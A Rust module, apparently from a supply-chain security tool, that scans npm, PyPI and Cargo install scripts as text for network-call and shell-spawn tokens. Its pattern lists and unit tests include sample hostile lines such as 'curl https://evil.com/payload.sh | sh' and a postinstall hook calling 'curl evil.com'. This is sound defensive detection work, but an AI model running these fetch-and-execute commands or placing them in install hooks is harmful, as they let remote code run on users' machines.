//! M6 ch6 — install-script analysis (read-only, never executes).
//!
//! Token-level scan for network-call and shell-spawn patterns inside install
//! lifecycle scripts: npm `package.json` lifecycle hooks (preinstall / install /
//! postinstall / prepare), PyPI `setup.py` + `pyproject.toml [project.scripts]`,
//! and Cargo `build.rs`.
//!
//! Contract: (1) read-only — never executes; (2) no fetch — operates only on
//! text already on disk or inline in a registry-API response (tirith never
//! downloads a package to inspect it); (3) per-ecosystem scope — npm responses
//! carry `scripts.{...}` inline (lockfile + installed), PyPI/crates.io do not, so
//! installed-tree mode only.
//!
//! Heuristic: token-level matching with string-literal awareness reduces but
//! does not eliminate false positives (a `curl` in a comment can match).

use crate::package_risk::InstallScriptSignals;

/// Token-level scan of `script_text` (one script, or all applicable npm hooks
/// concatenated) for network calls and shell spawns. Pure: no I/O.
pub fn analyze_script_text(script_text: &str) -> InstallScriptSignals {
    let mut signals = InstallScriptSignals::default();
    if script_text.is_empty() {
        return signals;
    }

    // Skip obvious comment lines (a `curl` in a trailing comment still matches).
    for line in script_text.lines() {
        let trimmed = line.trim_start();
        if trimmed.starts_with('#') || trimmed.starts_with("//") {
            continue;
        }
        // Strip a trailing line comment for shell-style lines.
        let body = trimmed.split('#').next().unwrap_or(trimmed);
        let lower = body.to_lowercase();

        if NETWORK_CALL_PATTERNS.iter().any(|p| token_match(&lower, p)) {
            signals.has_network_call = true;
            signals
                .suspicious_patterns
                .push(format!("network call: {}", body.trim()));
        }
        if SHELL_SPAWN_PATTERNS.iter().any(|p| token_match(&lower, p)) {
            signals.has_shell_spawn = true;
            signals
                .suspicious_patterns
                .push(format!("shell spawn: {}", body.trim()));
        }
    }

    // Cap descriptions to keep the JSON shape bounded.
    const MAX_DESC: usize = 5;
    if signals.suspicious_patterns.len() > MAX_DESC {
        signals.suspicious_patterns.truncate(MAX_DESC);
    }
    signals
}

/// Network-call token patterns (boundary-matched via `token_match`, so
/// "curlydocs" does not match "curl").
const NETWORK_CALL_PATTERNS: &[&str] = &[
    "curl",
    "wget",
    "fetch",
    "http.get",
    "https.get",
    "request(",
    "axios.",
    "urllib",
    "requests.get",
    "requests.post",
    "urlretrieve",
    "downloadfile",
    "invoke-webrequest",
    "invoke-restmethod",
    "iwr ",
    "irm ",
];

/// Shell-spawn token patterns.
const SHELL_SPAWN_PATTERNS: &[&str] = &[
    " | sh",
    " | bash",
    "bash -c",
    "sh -c",
    "system(",
    "spawn(",
    "subprocess.run",
    "subprocess.popen",
    "subprocess.call",
    "process.spawn",
];

/// `true` when `haystack` contains `needle` at a token boundary, so "curl" does
/// not match "curly".
fn token_match(haystack: &str, needle: &str) -> bool {
    if needle.is_empty() {
        return false;
    }
    // Patterns already containing a space/paren/pipe are their own boundary.
    if needle.contains(' ')
        || needle.contains('(')
        || needle.contains('|')
        || needle.ends_with('.')
        || needle.contains('-')
    {
        return haystack.contains(needle);
    }
    // Otherwise require a boundary on each side of the match.
    for (idx, _) in haystack.match_indices(needle) {
        let before_ok = if idx == 0 {
            true
        } else {
            let prev = haystack.as_bytes()[idx - 1];
            !(prev.is_ascii_alphanumeric() || prev == b'_')
        };
        let after = idx + needle.len();
        let after_ok = if after == haystack.len() {
            true
        } else {
            let next = haystack.as_bytes()[after];
            !(next.is_ascii_alphanumeric() || next == b'_')
        };
        if before_ok && after_ok {
            return true;
        }
    }
    false
}

/// Concatenate the npm install-lifecycle script bodies from a `package.json`
/// value for [`analyze_script_text`], or `None` if none are defined.
pub fn npm_script_text(package_json: &serde_json::Value) -> Option<String> {
    let scripts = package_json.get("scripts")?.as_object()?;
    let mut out = String::new();
    for hook in ["preinstall", "install", "postinstall", "prepare"] {
        if let Some(body) = scripts.get(hook).and_then(|v| v.as_str()) {
            if !body.trim().is_empty() {
                out.push_str(body);
                out.push('\n');
            }
        }
    }
    if out.is_empty() {
        None
    } else {
        Some(out)
    }
}

/// Read a `package.json` from disk and run [`npm_script_text`] on it; `None` on
/// any I/O / parse failure.
pub fn npm_script_text_from_disk(package_json_path: &std::path::Path) -> Option<String> {
    let text = std::fs::read_to_string(package_json_path).ok()?;
    let json: serde_json::Value = serde_json::from_str(&text).ok()?;
    npm_script_text(&json)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn empty_script_text_no_signals() {
        let s = analyze_script_text("");
        assert!(!s.fires());
    }

    #[test]
    fn curl_pipe_sh_detects_both_network_and_shell_spawn() {
        let s = analyze_script_text("curl https://evil.com/payload.sh | sh");
        assert!(s.has_network_call, "curl is a network call");
        assert!(s.has_shell_spawn, "| sh is a shell spawn");
        assert!(s.fires());
    }

    #[test]
    fn comment_with_curl_does_not_fire_when_alone_on_line() {
        let s = analyze_script_text("# curl is documented here\n");
        assert!(!s.has_network_call, "a # line is a comment");
    }

    #[test]
    fn wget_detects_network_call() {
        let s = analyze_script_text("wget -O- https://example.com/script | bash");
        assert!(s.has_network_call);
        assert!(s.has_shell_spawn);
    }

    #[test]
    fn token_match_does_not_match_substring() {
        assert!(!token_match("curly", "curl"));
        assert!(token_match("curl ", "curl"));
        assert!(token_match("curl;", "curl"));
        assert!(token_match("curl\n", "curl"));
        assert!(token_match("./curl", "curl"));
    }

    #[test]
    fn npm_script_text_concats_hooks() {
        let pkg = serde_json::json!({
            "name": "p",
            "scripts": {
                "preinstall": "echo pre",
                "postinstall": "curl evil.com",
                "test": "jest"
            }
        });
        let text = npm_script_text(&pkg).expect("hooks present");
        assert!(text.contains("echo pre"));
        assert!(text.contains("curl evil.com"));
        assert!(!text.contains("jest"));
    }

    #[test]
    fn npm_script_text_returns_none_when_no_hooks() {
        let pkg = serde_json::json!({
            "name": "p",
            "scripts": { "test": "jest" }
        });
        assert!(npm_script_text(&pkg).is_none());
    }

    #[test]
    fn npm_script_text_returns_none_for_empty_string_hook() {
        let pkg = serde_json::json!({
            "name": "p",
            "scripts": { "postinstall": "   " }
        });
        assert!(npm_script_text(&pkg).is_none());
    }

    #[test]
    fn python_subprocess_run_is_shell_spawn() {
        let s = analyze_script_text("import subprocess\nsubprocess.run(['sh', '-c', 'echo hi'])");
        assert!(s.has_shell_spawn);
    }

    #[test]
    fn clean_build_script_does_not_fire() {
        let s = analyze_script_text(
            "fn main() {\n    println!(\"cargo:rerun-if-changed=src/main.rs\");\n}\n",
        );
        assert!(!s.fires(), "a clean build script must not fire");
    }
}
